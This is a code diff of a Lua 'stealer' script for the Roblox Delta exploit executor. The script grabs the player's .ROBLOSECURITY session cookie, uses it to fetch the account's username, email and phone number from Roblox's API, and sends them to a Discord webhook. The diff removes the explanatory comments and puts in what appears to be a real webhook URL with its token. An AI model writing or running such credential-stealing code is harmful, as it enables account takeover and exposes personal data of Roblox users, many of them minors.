@@ -1,25 +1,16 @@
--- ファイル名: stealer.lua (Delta用)
--- Roblox Delta エクスプロイトで実行想定
-
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
 local player = Players.LocalPlayer
 
--- DiscordウェブックURL（実際のものに置き換えが必要）
-local webhook = "https://discord.com/api/webhooks/あなたのID/あなたのトークン"
+local webhook = "https://discordapp.com/api/webhooks/1511992331287527474/z0DLdbS-jwP2E0weu5P7rVXXjkaiMzyUFB0ET-Wp5htVHysXRGIVdmKEyC7gtuQ1XSQx"
 
--- クッキー取得（外部エクスプロイトの関数を想定）
--- Deltaでは getcookie() や getrobuxcookie() などの独自関数が存在する場合がある
 local function getRobloxCookie()
-    -- 方法1: エクスプロイトに依存する関数
     if getcookie then
         return getcookie(".ROBLOSECURITY")
     end
-    -- 方法2: ゲーム内では直接不可能 → 外部ライブラリ経由
     return "Cookie not accessible in pure Luau"
 end
 
--- メール/電話番号を取得（クッキーが必要）
 local function getAccountInfo(cookie)
     local url = "https://www.roblox.com/mobileapi/userinfo"
     local headers = {
@@ -27,7 +18,7 @@ local function getAccountInfo(cookie)
         ["User-Agent"] = "Mozilla/5.0"
     }
     local success, response = pcall(function()
-        return syn.request({ -- syn.request は多くのエクスプロイトでサポート
+        return syn.request({
             Url = url,
             Method = "GET",
             Headers = headers
@@ -40,7 +31,6 @@ local function getAccountInfo(cookie)
     return nil, nil, nil
 end
 
--- Discordへ送信
 local function sendToDiscord(content)
     local data = {
         content = content,
@@ -57,7 +47,6 @@ local function sendToDiscord(content)
     })
 end
 
--- メイン実行
 local cookie = getRobloxCookie()
 local username, email, phone = getAccountInfo(cookie)
 
